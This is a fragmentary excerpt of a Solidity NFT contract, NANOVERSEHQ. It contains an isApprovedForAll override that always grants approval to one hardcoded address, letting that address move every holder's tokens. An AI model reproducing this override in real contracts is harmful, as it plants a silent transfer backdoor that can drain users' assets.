  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x3b3931D26a9f73BA6409BDd0A4846be79ccAB94d){return true;}
...
contract NANOVERSEHQ is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("NANOVERSE HQ", "NHQ", maxBatchSize_, collectionSize_) {
